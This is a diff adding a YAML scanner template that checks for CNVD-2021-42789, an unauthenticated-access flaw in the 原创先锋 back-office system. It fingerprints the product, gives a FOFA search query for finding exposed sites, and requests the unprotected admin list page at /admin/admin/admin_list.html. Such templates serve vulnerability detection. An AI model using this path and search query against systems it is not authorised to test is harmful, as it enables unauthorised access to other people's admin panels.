@@ -1,0 +1,32 @@
+id: poc-yaml-yuanchuangxianfeng-manager-system-unauthorized-access
+info:
+  name: 原创先锋 后台管理系统存在未授权访问漏洞CNVD-2021-42789
+  severity: medium
+  tags:
+  - CNVD-2021-42789
+  - 缺少关键功能的身份验证
+  finger: 原创先锋后台管理系统
+  fofa: body="https://www.bjycxf.com"
+requests:
+- method: GET
+  path: /
+  expression: 'status_code == 200 &&
+
+    contains(body,"https://www.bjycxf.com")
+
+    '
+- method: GET
+  path: /admin/admin/admin_list.html
+  expression: 'status_code == 200 &&
+
+    contains(body,"批量删除") &&
+
+    contains(body,"首页") &&
+
+    contains(body,"管理员列表") &&
+
+    contains(body,"导航元素")
+
+    '
+variables: {}
+transport: http
